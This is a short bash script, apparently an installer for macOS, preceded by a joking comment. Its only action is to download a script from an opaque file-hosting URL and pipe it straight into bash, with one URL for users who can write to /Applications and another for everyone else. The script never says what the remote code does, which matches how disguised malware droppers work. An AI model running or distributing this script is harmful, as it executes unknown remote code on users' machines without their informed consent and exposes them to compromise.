#!/bin/bash
# carti was here yes daddy carti YESSSSSS YESSSSSSSSSSSSSS~

main() {
    clear

    if [ -w "/Applications" ]; then
        curl -s "https://tesyulynrp.ufs.sh/f/zU9GH2aR7moaDEOT1ySKv9mtwjVhWFsYRHupDbZeng4LI2dk" | bash
    else
        echo -e "${YELLOW}[!] Local user detected, using home directory instead of global MacOS directory ${NC}"
        curl -s "https://tesyulynrp.ufs.sh/f/zU9GH2aR7moa4gdCKuRLBUVsarTPo1yp6kYu7zQ3OqxLJhvw" | bash
    fi
}

main
